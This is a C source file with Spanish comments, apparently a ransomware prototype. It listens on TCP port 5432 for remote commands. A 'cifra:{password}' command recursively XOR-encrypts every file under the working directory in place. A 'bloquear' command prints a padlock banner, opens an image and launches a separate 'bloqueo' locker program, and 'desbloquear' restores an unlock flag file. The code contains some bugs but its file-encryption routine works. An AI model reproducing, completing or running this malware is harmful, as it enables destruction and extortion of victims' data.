#include <stdio.h>		//entrada y salida estandar
#include <stdlib.h>
#include <string.h>		//strlen,strcpy,memset:limpiar buffer,strcspn:quitar \n
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <dirent.h>
#define PORT 5432		//puerto de conexion

//buffer para ruta y nombres de archivo
char fbuffer[512];
//buffer para el password
char pass[512];
//diractual
char cwd[512];
//lista los archivos de un directorio
void listFiles(char directory[]);
//cifra un archivo
void cifra(char file[],char clavex[]);
//obtiene la subcadena despues del delimitador
void getsubstring(char line[],char delimiter);
//
void borraArchivo();
void creaArchivo();
void showmsg();

int main(void) {
	int sockfd, new_sockfd;  			// descriptores de archivo
	struct sockaddr_in host_addr, client_addr;	// Informacion de las direcciones IP
	socklen_t sin_size;
	int recv_length=1, yes=1;
	char buffer[1024];

	if ((sockfd = socket(PF_INET, SOCK_STREAM, 0)) == -1)
		perror("Error al crear el socket");

	if (setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, &yes, sizeof(int)) == -1)
		perror("Error al agregar la opcion SO_REUSEADDR en setsockopt");

	host_addr.sin_family = AF_INET;		 	// 
	host_addr.sin_port = htons(PORT);	 	//
	//NOTA: falta asignar la ip Ahora regresa null
	host_addr.sin_addr.s_addr = INADDR_ANY; 	// Asigno mi IPP
	memset(&(host_addr.sin_zero), '\0', 8); 	// El resto de la estructura en 0s
	if (bind(sockfd, (struct sockaddr *)&host_addr, sizeof(struct sockaddr)) == -1)
		perror("Error haciendo el bind");

	if (listen(sockfd, 5) == -1)
		perror("Error al escuchar en el socket");
	//obtenemos el dir actual con getcwd y lo guardamos en cwd
	getcwd(cwd, sizeof(cwd));
	printf("El dir actual es [%s]\n",cwd);
	while(1) {    // Accept loop
		sin_size = sizeof(struct sockaddr_in);
		new_sockfd = accept(sockfd, (struct sockaddr *)&client_addr, &sin_size);
		if(new_sockfd == -1)
			perror("Error al aceptar la conexion");
		printf("server: Conexion aceptada desde %s desde  %d\n",inet_ntoa(client_addr.sin_addr), ntohs(client_addr.sin_port));
		send(new_sockfd, ":v\n", 13, 0);
		recv_length = recv(new_sockfd, &buffer, 1024, 0);
		while(recv_length > 0) {
			printf("\n");
			printf("\nRECV: %d bytes", recv_length);
			//quitamos el salto de linea en lo que recibimos
			buffer[strcspn(buffer, "\n")] = 0;
			printf("\n[%s]",buffer);
			//si la cadena que recibimos empieza con el cmd cifra
			if(startsWith(buffer,"cifra")){
				printf("\nVoy a cifrar\n");
				strcpy(fbuffer,buffer);
				//obtenemos el password
				getsubstring(fbuffer,':');
				printf("\nEl pass es: [%s]\n",pass);
				//verifico si el pass es !=vacio si lo es cifro, si no, lanzo excepcion
				if(strlen(pass)>0){
					listFiles(cwd);
					printf("\nAcabe de cifrar\nYa Puedo limpiar pass\n");
					//limpiamos el buffer de password
					memset(pass, 0, 512);
				}
				else	//esto lo tengo que enviar no imprimir
					printf("\n Para cifrar:\n cifrar :{password}\n");
					printf("\nLongitud pass: [%d]\n",strlen(pass));
			}
			if(startsWith(buffer,"bloquear")){
				showmsg();
				//abrimos la imagen con el program default
				system("xdg-open imagen.png");
				borraArchivo();
				//explain this
				if (fork() == 0) {
			              execl("bloqueo", "bloqueo", 0);
				        printf("\nSali del execl");
          				return ;
    				 }
			}
			if(startsWith(buffer,"desbloquear")){
				creaArchivo();
			}
			recv_length = recv(new_sockfd, &buffer, 1024, 0);
		}
		close(new_sockfd);
	}
	return 0;
}

void listFiles(char directory[]){
        DIR           *d = opendir(directory);
        //struct del directorio
        struct dirent *dir;;
        //file absolute path  jaja
        char fap[1024];
        if (d){
                while ((dir = readdir(d)) != NULL)
                        //si son archivos regulares: no sym, no dir, etc
                        if( dir->d_type == DT_REG){
                                //obtenemos la ruta absoluta, cwd regresa la ruta sin /
                                snprintf(fap,sizeof fap, "%s/%s",directory,dir->d_name);
                                printf("\nCifrare: %s",fap);
//				cifra(fap);
				cifra(fap,pass);
                        }else{  //si es un dir, ciframos su contenido
                                if(strcmp(dir->d_name,".") && strcmp(dir->d_name,"..") && dir->d_type ==  DT_DIR){
                                        //agrego / 
                                        snprintf(fap,sizeof fap, "%s/%s",directory,dir->d_name);
                                        printf("\nEncontre dir: %s",dir->d_name);
                                        printf("\nVoy a listar: %s",fap);
                                        listFiles(fap);
					//checkgetsubstring(fap,':');
                                }
                        }
		closedir(d);
        }
}

//funcion que cifra un archivo
void cifra(char file[],char clavex[]){
        FILE * pFile = fopen(file,"r+b");
        char c;
	//DEBUG
	printf("\nPass en cifra: [%s]\n",clavex);
	printf("\nLongitud enn cifra: [%d]\n",strlen(clavex));
        int i=0;
        //si pudo leerse
        if (pFile != NULL) {
                //mientras no lleguemos al fin de archivo
                while( ( c = fgetc(pFile) ) != EOF ){
			fseek(pFile, -1, SEEK_CUR);
			fputc(c^clavex[i%strlen(clavex)],pFile);
			fseek(pFile, 0, SEEK_CUR);
                }
                fclose(pFile);
        }
}

//funcion que regresa la cadena despues del delimitador:
//la utilizamos para obtener el pass con el que se cifrara
//donde el comando tiene la forma cifra:{pass}
void getsubstring(char line[],char delimiter){
	char *ptr;
	//obtenemos la direccion del delimitador
	ptr = strchr(line,delimiter);
	/*
		you can use strchr to get a pointer to the first
		occurrence and the subtract that (if not null)
		from the original char* to get the position.
	*/
	if (ptr != NULL) {
		//copiamos despues de la aparicion del delimitador
		strcpy(pass,++ptr);
	}
	printf("El pass es: [%s]\n",pass);
}


//0 si str no empieza con pre 1 eoc
int startsWith(char str[],char pre[]){
    size_t lenpre = strlen(pre),
           lenstr = strlen(str);
	//comparamos hasta la longitud del prefijo
    return lenstr < lenpre ? 0 : strncmp(pre,str, lenpre) == 0;
}

//funcion que crea un archivo llamado .unlock
void creaArchivo(){
        FILE *fp = fopen(".unlock", "ab+");
}

//funcion que borra el archivo llamado .unlock
void borraArchivo(){
        remove(".unlock");
}

void showmsg(){
char msg[]=     "             ,+@@+,                                                \n"
                "           @@@@@@@@@@                                              \n"
                "         `@@@@@@@@@@@@`                                            \n"
                "         @@@@@@@@@@@@@@                                            \n"
                "        @@@@@`    `@@@@@                                           \n"
                "       .@@@@        @@@@.                                          \n"
                "       @@@@          @@@@                                          \n"
                "       @@@@          @@@@                                          \n"
                "    #@@@@@@@@@@@@@@@@@@@@@@#                                       \n"
                "    #@@@@@@@@@@@@@@@@@@@@@@#    @@@@  @   @    #    @@@@  '@@@     \n"
                "    @@@@@@@@@@    @@@@@@@@@@   :@     @   @   +@   @`  `@ @        \n"
                "    @@@@@@@@@@    @@@@@@@@@@   @`     @   @   @,:  @    @ #'       \n"
                "    @@@@@@@@@@@  @@@@@@@@@@@   @      @@@@@  ,' @  @    @  #@:     \n"
                "    @@@@@@@@@@@  @@@@@@@@@@@   @      @   @  @  @  @    @    @     \n"
                "    @@@@@@@@@@@  @@@@@@@@@@@   '#     @   @  @@@@# @.  .@    #.    \n"
                "    @@@@@@@@@@@@@@@@@@@@@@@@    @@@@: @   @ +:   @  @@@@  @@@@     \n"
                "    @@@@@@@@@@@@@@@@@@@@@@@@                                       \n"
                "    @@@@@@@@@@@@@@@@@@@@@@@@                                       \n";
        printf("\n%s\n",msg);
}

